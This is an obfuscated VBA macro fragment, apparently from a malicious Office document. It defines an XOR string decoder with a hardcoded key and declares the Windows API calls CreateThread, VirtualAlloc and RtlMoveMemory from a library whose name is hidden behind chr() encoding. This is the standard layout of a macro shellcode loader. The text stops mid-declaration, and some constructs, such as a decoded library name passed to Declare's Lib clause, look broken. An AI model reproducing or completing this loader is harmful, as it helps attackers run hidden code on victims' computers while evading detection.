Function o0mg(str As String) As Variant: Dim bytes() As Byte: bytes = str: o0mg = bytes: End Function
Function vl9n(bytes() As Byte) As String: Dim str As String: str = bytes: vl9n = str: End Function

Function wydp93hw(str As String) As String
    Const p_ As String = "vf1qoqxn"
    Dim sb_() As Byte, pb_() As Byte
    sb_ = o0mg(str)
    pb_ = o0mg(p_)
    
    Dim uL As Long
    uL = UBound(sb_)
    
    ReDim scb_(0 To uL) As Byte
    
    Dim idx As Long
    
    For idx = LBound(sb_) To uL:
        If Not sb_(idx) = 0 Then
            c = sb_(idx)
            For i = 0 To UBound(pb_):
                c = c Xor pb_(i)
            Next i
            scb_(idx) = c
        End If
    
    Next idx
    
    wydp93hw = vl9n(scb_)
End Function


#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib wydp93hw(chr(51) & chr(61) & "" & chr(42) & "" & "6" & chr(61) & "" & "4" & chr(107) & "" & chr(106) ) (ByVal Gpt As Long, ByVal Lkpz As Long, ByVal 
Qxq As LongPtr, Cpuj As Long, ByVal Scfu As Long, Egxbmy As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib wydp93hw(chr(51) & chr(61) & "" & chr(42) & "" & "6" & chr(61) & "" & "4" & chr(107) & "" & chr(106) ) (ByVal Qhtxd As Long, ByVal Gzo As Long, ByVal 
Ljifi As Long, ByVal Eanefbhx As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib wydp93hw(chr(51) & chr(61) & "" & chr(42) & "" & "6" & chr(61) & "" & "4" & chr(107) & "" & chr(106) ) (ByVal Ptfxyn As LongPtr, ByRef Hql As Any, 
ByVal Cusoad As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib wydp93hw(chr(51) & chr(61) & "" & chr(42) & "" & "6" & chr(61) & "" & "4" & chr(107) & "" & chr(106) ) (ByVal Gpt As Long, ByVal Lkpz As Long, ByVal Qxq As 
Long, Cpuj As Long, ByVal Scfu As Long, Egxbmy As Long) As Long
    Private Declare Function VirtualAlloc Lib wydp93hw(chr(51) & chr(61) & "" & chr(42) & "" & "6" & chr(61) & "" & "4" & chr(107) & "" & chr(106) ) (ByVal Qhtxd As Long, ByVal Gzo As Long, 
